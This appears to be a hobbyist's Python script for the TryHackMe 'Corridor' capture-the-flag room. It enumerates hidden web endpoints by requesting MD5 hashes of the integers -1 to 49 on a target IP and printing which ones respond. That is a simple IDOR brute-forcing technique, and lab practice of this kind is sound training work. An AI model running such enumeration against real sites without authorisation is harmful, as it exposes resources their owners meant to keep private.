'''
Made by Linkinparkophile 🍀
I used this script to automate the process of finding endpoints in the web application 
while playing CORRIDOR capture the flag challenge in TryHackMe. 
Make sure that the necessary libraries are provided for you.
Just enter your MACHINE_IP as an input and take the result!
'''

import requests
import hashlib
import re

def generate_md5_hash(input):
    return hashlib.md5(str(input).encode()).hexdigest()

def main(MACHINE_IP):
    if not re.match(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', MACHINE_IP):
      print("This is an invalid IP address! Please, provide a valid one!")
      return
    for i in range(-1,50):
        try:
            hash = generate_md5_hash(i)
            response = requests.get(f'http://{MACHINE_IP}/{hash}')

            if response.status_code == 200:
                print(f'Response found for {i} - generated hash: {hash}')
            else:
                print(f'Request failed for {i}.')
        except requests.exceptions.RequestException as e:
            print('Request operation failed!')

if __name__ == "__main__":
    MACHINE_IP = input("Enter the machine IP, please.\nThis IP is the address of your target machine in the Corridor Room.\n")
    main(MACHINE_IP)
